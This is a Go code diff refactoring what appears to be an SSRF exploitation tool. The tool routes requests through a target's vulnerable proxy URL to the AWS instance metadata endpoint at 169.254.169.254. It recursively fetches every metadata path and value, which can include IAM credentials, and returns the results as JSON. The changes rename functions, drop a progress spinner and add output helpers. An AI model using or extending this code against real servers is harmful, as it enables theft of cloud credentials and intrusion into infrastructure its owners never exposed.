@@ -29,7 +29,7 @@ type Proxy struct {
 var awsBaseURL string = "http://169.254.169.254/"
 var proxyURL string
 
-func Banner() {
+func banner() {
 	colorReset := "\033[0m"
 	colorOrange := "\033[38;5;208m"
 	fmt.Println(string(colorOrange), `
@@ -41,41 +41,23 @@ func Banner() {
 				  `, string(colorReset))
 }
 
-func Spinner() func(verbose bool) string {
-	spinner := "-"
-	counter := 0
-	return func(verbose bool) string {
-		if verbose {
-			return "\n[" + spinner + "]"
-		} else {
-			mod := counter % 4
-			switch mod {
-			case 0:
-				spinner = "-"
-			case 1:
-				spinner = "\\"
-			case 2:
-				spinner = "|"
-			case 3:
-				spinner = "/"
-			}
-			counter = counter + 1
-			return "\r\033[K[" + spinner + "]"
-		}
-	}
+type AWSJSON string
+
+func (EnumerateAWS AWSJSON) ToFile(path string) {
+	fmt.Println(EnumerateAWS)
 }
 
-var spinner = Spinner()
-var Verbose = false
-
-func EnumerateAWS(proxyUrl string, encoder Encoder, verbose bool) (jsonStructure string) {
-	return EnumerateAWSFull(proxyUrl, false, encoder, verbose)
+func (EnumerateAWS AWSJSON) Print() {
+	fmt.Println("\n" + EnumerateAWS)
 }
 
-func EnumerateAWSFull(proxyUrl string, allVersions bool, encoder Encoder, verbose bool) (jsonStructure string) {
-	Verbose = verbose
+func EnumerateAWS(proxyUrl string, encoder Encoder) (jsonStructure AWSJSON) {
+	return enumerateAWSFull(proxyUrl, false, encoder)
+}
+
+func enumerateAWSFull(proxyUrl string, allVersions bool, encoder Encoder) (jsonStructure AWSJSON) {
 	proxyURL = proxyUrl
-	Banner()
+	banner()
 	fmt.Println("[+] Using Proxy: " + proxyURL)
 
 	if !Verbose {
@@ -86,39 +68,39 @@ func EnumerateAWSFull(proxyUrl string, allVersions bool, encoder Encoder, verbos
 	awss.Children = make([]interface{}, 0)
 
 	if allVersions {
-		RecursiveFetch(0, "", &awss.Children, encoder)
+		recursiveFetch(0, "", &awss.Children, encoder)
 	} else {
-		RecursiveFetch(1, "latest/", &awss.Children, encoder)
+		recursiveFetch(1, "latest/", &awss.Children, encoder)
 	}
 
 	fmt.Printf("\r[+] Enumeration Complete!\033[K\n")
 
-	b, err := json.Marshal(awss)
+	b, err := json.MarshalIndent(awss, "", "  ")
 	if err != nil {
 		panic(err)
 	}
 	fmt.Println("[+] Returning AWS Structure as JSON")
-	return string(b)
+	return AWSJSON(string(b))
 }
 
-func RecursiveFetch(depth int, path string, parent *[]interface{}, encoder Encoder) {
-	status, items := FetchProxyData(proxyURL, awsBaseURL+path, encoder)
+func recursiveFetch(depth int, path string, parent *[]interface{}, encoder Encoder) {
+	status, items := fetchProxyData(proxyURL, awsBaseURL+path, encoder)
 	if status == "200 OK" {
 		for _, item := range items {
 			if depth < 2 {
 				item = item + "/"
 			}
-			fmt.Printf(spinner(Verbose) + " Enumerating: " + path + item)
+			fmt.Printf(spin(Verbose) + " Enumerating: " + path + item)
 			if strings.HasSuffix(item, "/") {
 				self := new(Directory)
 				self.Path = path + item
 				self.Children = make([]interface{}, 0)
 				*parent = append(*parent, &self)
-				RecursiveFetch(depth+1, self.Path, &self.Children, encoder)
+				recursiveFetch(depth+1, self.Path, &self.Children, encoder)
 			} else {
 				self := new(File)
 				self.Path = path + item
-				status, contents := FetchProxyData(proxyURL, awsBaseURL+self.Path, encoder)
+				status, contents := fetchProxyData(proxyURL, awsBaseURL+self.Path, encoder)
 				if status == "200 OK" {
 					self.Value = strings.Join(contents, "\n")
 				} else {
@@ -130,13 +112,13 @@ func RecursiveFetch(depth int, path string, parent *[]interface{}, encoder Encod
 	}
 }
 
-func FetchProxyData(proxy, endpoint string, encoder Encoder) (status string, body []string) {
-	proxy = CreateURL(proxy, endpoint, encoder)
-	status, data := FetchURL(proxy)
+func fetchProxyData(proxy, endpoint string, encoder Encoder) (status string, body []string) {
+	proxy = createURL(proxy, endpoint, encoder)
+	status, data := fetchURL(proxy)
 	return status, data
 }
 
-func FetchURL(url string) (status string, body []string) {
+func fetchURL(url string) (status string, body []string) {
 	t := http.DefaultTransport.(*http.Transport).Clone()
 	t.MaxIdleConns = 100
 	t.MaxConnsPerHost = 100
@@ -164,13 +146,7 @@ func FetchURL(url string) (status string, body []string) {
 	return resp.Status, lines
 }
 
-type Encoder func(string) string
-
-func PassthroughEncoder(endpoint string) string {
-	return endpoint
-}
-
-func CreateURL(proxy, endpoint string, encoder Encoder) string {
+func createURL(proxy, endpoint string, encoder Encoder) string {
 	proxy = strings.Replace(proxy, "{0}", encoder(endpoint), 1)
 	return proxy
 }
